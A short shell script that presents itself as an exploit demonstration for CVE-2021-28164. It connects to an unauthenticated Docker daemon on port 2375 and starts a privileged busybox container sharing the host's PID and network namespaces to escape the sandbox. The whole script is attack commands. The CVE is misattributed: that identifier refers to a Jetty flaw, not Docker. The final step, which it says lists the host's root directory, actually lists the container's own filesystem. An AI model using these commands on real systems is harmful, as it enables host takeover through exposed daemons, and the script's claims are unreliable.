#!/bin/sh
# This script demonstrates the exploit for CVE-2021-28164 by creating a privileged container
# that can escape the Docker sandbox via the vulnerable Docker Engine version.

# Connect to the insecure Docker daemon exposed by the dind service
DOCKER_HOST=tcp://localhost:2375
export DOCKER_HOST

# Pull a lightweight busybox image
docker pull busybox:latest

# Run a container with host PID and NET namespace to gain elevated access
docker run -d --pid=host --net=host --privileged busybox sleep 1000

# Inside the privileged container, you can now access the host filesystem
# Example: list root directory of the host
docker exec $(docker ps -q | head -n1) ls -l /